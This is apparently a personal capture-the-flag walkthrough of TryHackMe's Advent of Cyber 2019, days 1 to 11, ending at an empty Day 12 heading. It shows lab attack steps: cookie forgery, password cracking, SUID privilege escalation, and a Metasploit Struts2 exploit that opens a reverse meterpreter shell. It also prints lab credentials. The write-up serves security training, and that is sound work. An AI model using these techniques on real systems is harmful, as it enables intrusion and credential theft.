# [Advent of Cyber 1 [2019]](https://tryhackme.com/room/25daysofchristmas)

> Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 1: Inventory Management

go to webpage

![image](https://user-images.githubusercontent.com/90561566/203717333-07ef16e3-fcca-4c5e-b9cb-3e2a6dec6d50.png)

go to register page and register one

![image](https://user-images.githubusercontent.com/90561566/203718107-53deeee9-9e8c-4b1a-8acb-e2fb220c56d7.png)

Ctrl+Shift+I and go to storage tab and see the cookies

![image](https://user-images.githubusercontent.com/90561566/203718318-3ef31a2f-e106-4698-8c18-b7ff8bc12744.png)

Access the cookie and decode the value which is encoded in base64 (%3D is '=')

![image](https://user-images.githubusercontent.com/90561566/203719731-ff3f989b-2d61-49c8-9c42-63b0f195985d.png)

Your username is the first part and second part will be same for everybody `v4er9ll1!ss`

now leverage this to login mcinventory's account `mcinventoryv4er9ll1!ss`

encode it to base64, you can search online for tools

`bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw%3D%3D` copy and paste it into the value and refresh

![image](https://user-images.githubusercontent.com/90561566/203721108-0a11b0af-ae72-4888-bffd-43ba25dcf5fb.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/203721147-85eef5a0-f731-4f96-9006-5de676e86f13.png)

## Day 2: Arctic Forum

go to webpage

![image](https://user-images.githubusercontent.com/90561566/203722501-2012b3b8-686b-4370-b19a-800750c79d66.png)

```
gobuster dir -u http://10.10.89.166:3000 -w /usr/share/wordlists/dirb/common.txt -t 30
```

i see a hiden page under /SysAdmin

![image](https://user-images.githubusercontent.com/90561566/203722926-52f49d0f-1187-42de-bf4f-1f9e5748e2e6.png)

hmm nothing here

![image](https://user-images.githubusercontent.com/90561566/203723299-1e449612-0c70-4c2b-843b-b3cec294a22a.png)

view page source

![image](https://user-images.githubusercontent.com/90561566/203723408-dcfb0b45-512a-4692-a45f-1aa703350b06.png)

google it and here is the answer

![image](https://user-images.githubusercontent.com/90561566/203723600-93521a3d-9b07-4541-bc2a-09701ca2f673.png)

login with that credential

![image](https://user-images.githubusercontent.com/90561566/203724045-5f66672c-4708-42ae-8e63-b5410cee9eb8.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/203724375-6069c244-4cf4-430d-b267-eb1fc821f26b.png)

## Day 3: Evil Elf

we receive a pcap file, open it with wireshark

![image](https://user-images.githubusercontent.com/90561566/203924984-d9fb7196-ae3a-41c7-86c7-1ffa448f98e9.png)

destination ip of packet 998

![image](https://user-images.githubusercontent.com/90561566/203925740-cf894440-8244-4e37-9e71-6174f903a4ee.png)

search christmas and i see a ps4

![image](https://user-images.githubusercontent.com/90561566/203925911-57e2236d-18b5-4545-8304-1e8aab912a2f.png)

right click by that telnet packet and follow tcp stream

![image](https://user-images.githubusercontent.com/90561566/203926218-81c8963e-8416-416c-a3f1-2240d305fcc2.png)

copy its hash and crack the password

```
hashcat -a 0 -m 1800 pass.txt /usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/90561566/203927701-95099895-ce54-432d-b6c5-f836d97b2f27.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/203927756-1a7a26e4-e544-40bd-aa7a-84d53c3e22db.png)

## Day 4: Training

ssh into server

```
ssh mcsysadmin@10.10.167.35
```

![image](https://user-images.githubusercontent.com/90561566/204207865-8d0cb396-ac0d-4040-8389-3835f987dc6c.png)

look around

```
ls
grep "password" *
```

![image](https://user-images.githubusercontent.com/90561566/204207179-dd154425-3a5c-4e5e-88df-0de50cd6ccd2.png)

search file contain ip address using regex

```
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" *
```

![image](https://user-images.githubusercontent.com/90561566/204208001-4f5fe63a-c76a-437e-af18-dc6cd7364a1f.png)

user can log into this machine

```
cat /etc/passwd | grep bash
```

![image](https://user-images.githubusercontent.com/90561566/204208779-c6bcc775-dfdf-47a4-94e4-d86305ffc85f.png)

sha1 hash of file8

```
sha1sum file8
```

![image](https://user-images.githubusercontent.com/90561566/204208865-f6a16486-cba0-419e-b828-b29f1548c8ec.png)

we don't have permission to see /etc/shadow but we can find its backup

```
locate shadow | grep bak
```

![image](https://user-images.githubusercontent.com/90561566/204209600-35af51b2-6e26-48fc-90a8-33f1e1e9047a.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/204211018-feb7a9b7-bc00-4a00-acd2-8c53e504efed.png)

## Day 5: Ho-Ho-Hosint

it give me a jpg file

```
exiftool thegrinch.jpg
```

![image](https://user-images.githubusercontent.com/90561566/204210699-966a1a27-8a8b-4049-bbf1-e8614886f6d6.png)

search on gg

![image](https://user-images.githubusercontent.com/90561566/204210793-afdea76f-a651-4d4f-8085-5591aa65d114.png)

go to [waybackmachine](https://archive.org/web/) and look back her website

![image](https://user-images.githubusercontent.com/90561566/204212360-bbdb81e6-43a3-41f5-8799-6bf30415389a.png)

23/10/2019 is the first time she start her blog, but it's 5 years after her photography

![image](https://user-images.githubusercontent.com/90561566/204212578-89f55346-11bb-4817-8068-1e97e21c01fd.png)

find the first image on gg, it's Ada Lovelace

![image](https://user-images.githubusercontent.com/90561566/204212975-6035edae-8beb-47c3-a76e-c5b43046c1ce.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/204213191-f26d0748-fe5b-411e-ba37-8e810ecbb41f.png)

## Day 6: Data Elf-iltration

open pcap file with wireshark, filder by dns, i can see a hex sub domain here

![image](https://user-images.githubusercontent.com/90561566/205005190-4937ebe8-1aa0-4a72-ac4a-e1209b79ff68.png)

```
echo "43616e64792043616e652053657269616c204e756d6265722038343931" | xxd -r -p
```

![image](https://user-images.githubusercontent.com/90561566/205005658-0926defd-4888-4bdc-8eed-fe8cb74547e1.png)

export objects, i see 2 files are 1 zip and 1 image

![image](https://user-images.githubusercontent.com/90561566/205006471-d5ee677f-6cee-4d21-8c48-15554c83f1cb.png)

zip file is protected with password, you need to crack it

```
fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v christmaslists.zip
unzip christmaslists.zip
```

![image](https://user-images.githubusercontent.com/90561566/205007918-ac4cca96-0c3d-415e-a0b3-e0f49005effc.png)

cat timmy wish

![image](https://user-images.githubusercontent.com/90561566/205008256-0256f7d6-dc23-45a4-9b42-554f0a527412.png)

extract hidden info from the image

```
steghide extract -sf TryHackMe.jpg
```

luckily, there needn't passphrase

![image](https://user-images.githubusercontent.com/90561566/205009667-3d436e2e-5fa5-4c2c-89bc-45bfce1b5235.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/205010278-227fc891-3a99-4c5e-b7db-5001ad201367.png)

## Day 7: Skilling Up

scan the target

```
nmap -A -T4 10.10.195.1
```

![image](https://user-images.githubusercontent.com/90561566/205088147-baba06d9-b1fb-4125-9f9d-da2ffb318255.png)

there are 3 open ports are 22, 111, 999

os name is `linux`

![image](https://user-images.githubusercontent.com/90561566/205089369-6bed4887-50a1-425a-91f2-15e567676aaf.png)

check the web page at port 999

![image](https://user-images.githubusercontent.com/90561566/205089220-57f0cc24-b7a9-40fa-a88b-eda29f304b1d.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/205089713-92693498-0268-406b-a7a3-640cece93c26.png)

## Day 8: SUID Shenanigans

scan the target

```
nmap -p- -T4 10.10.192.12
```

it took too much time to find, but the hint suggest us ssh is running on port 65534

![image](https://user-images.githubusercontent.com/90561566/209459903-53089b6c-9f7d-475d-a595-3160ca16da7e.png)

```
ssh holly@10.10.192.12 -p65534
tuD@4vt0G*TU
```

```
ls -l /usr/bin/find
```

find command is actually owned by Igor and he has SUID permission

![image](https://user-images.githubusercontent.com/90561566/209460158-0b3db96e-f9e0-4c9a-955b-0bb4b5a58573.png)

```
find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;
```

![image](https://user-images.githubusercontent.com/90561566/209460222-9c76f61b-fbb9-40e3-8bc3-111f54f515ed.png)

find root binary

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin"
```

i found /usr/bin/system-control has execute permission

```
system-control
cat /root/flag2.txt
```

![image](https://user-images.githubusercontent.com/90561566/209460328-c071a878-8094-462e-8bae-b3f462cb04a3.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209460368-d1488727-ede9-4d69-bf00-984f3f3f37ff.png)

## Day 9: Requests

view web at port 3000

![image](https://user-images.githubusercontent.com/90561566/209495379-0e12b25e-6318-4d58-a614-9ed89a1c6e3e.png)

create a python file

```
import requests
host = "http://10.10.169.100:3000"
path = "/"
values = []
while path != "/end":
  response=requests.get(host+path)
  json_response = response.json()
  path = "/" + json_response["next"]
  if path != "/end":
    values.append(json_response["value"])
print("".join(values))
```

Answer

![image](https://user-images.githubusercontent.com/90561566/209495483-dcf6c360-863c-4716-9b71-9fff8ea6310f.png)

## Day 10: Metasploit-a-ho-ho-ho

quick scan the target

```
nmap -A -T4 10.10.144.227
```

![image](https://user-images.githubusercontent.com/90561566/209523038-96ce8da9-8a54-4ac8-bde3-43847e4e4007.png)

i know it has a vulnerability related to Apache Struts2

```
msfconsole
search Apache Struts2
```

![image](https://user-images.githubusercontent.com/90561566/209524167-d2de55c0-00dc-478a-90fe-b34fb32fe795.png)

```
set RHOSTS 10.10.144.227
set RPORT 80
set TARGETURI /showcase.action
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.8.0.74
exploit
```

exploit successful

![image](https://user-images.githubusercontent.com/90561566/209525033-d24044ba-9897-452c-83a0-ff04595379e7.png)

```
shell
find / 2>>/dev/null | grep -i "flag"
```

![image](https://user-images.githubusercontent.com/90561566/209525741-bc3ba341-b07b-4280-859b-e7b2bfdf4860.png)

```
cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
```

i found santa password at his folder

![image](https://user-images.githubusercontent.com/90561566/209526132-1330f313-b44b-4ec8-bf17-a141bf86dbc4.png)

```
ssh santa@10.10.144.227
```

![image](https://user-images.githubusercontent.com/90561566/209526317-c143ce01-e91c-447a-bb70-f866a728de1d.png)

```
cat -n naughty_list.txt | grep 148
cat -n nice_list.txt | grep 52
```

![image](https://user-images.githubusercontent.com/90561566/209527167-dc12f893-7748-483c-a968-bc0bcac5a304.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209527294-5c9b5989-2e03-4541-b7a8-2901fed312e8.png)

## Day 11: Elf Applications

scan the target

```
nmap -A -T4 10.10.254.238
```

we can see a lot of open ports here (21 ftp, 22 ssh, 111 rpc, 2049 nfs, 3306 mysql)

![image](https://user-images.githubusercontent.com/90561566/209626327-db765ccf-fe97-438f-ab86-0e8192c00aff.png)

login ftp by anonymous acc

```
ftp 10.10.254.238
anonymous
```

![image](https://user-images.githubusercontent.com/90561566/209628133-20292d25-393a-46ca-8689-5e237149e6ea.png)

```
binary
get file.txt
exit
```

we have mysql password `ff912ADB*`

![image](https://user-images.githubusercontent.com/90561566/209628362-eeca2d6c-60c1-4396-b923-6cc6ef83aa28.png)

```
mkdir /mnt/thm
mount 10.10.254.238:/opt/files /mnt/thm
```

we have creds.txt

![image](https://user-images.githubusercontent.com/90561566/209629545-b5829fd6-1f3b-4139-9489-9032160068b1.png)

```
mysql -h 10.10.254.238 -u 'root' -p 'ff912ADB*'
show databases;
```

![image](https://user-images.githubusercontent.com/90561566/209630234-d2e8dda8-1bcf-4597-b28b-2f35415675af.png)

```
use data;
show tables;
select * from USERS;
```

![image](https://user-images.githubusercontent.com/90561566/209631080-cb73e125-564b-4eaa-afd5-aee551b9db97.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209633480-0a7572c6-a1df-4bc5-9b5d-c5ca6f5fae1d.png)

## Day 12: Elfcryption






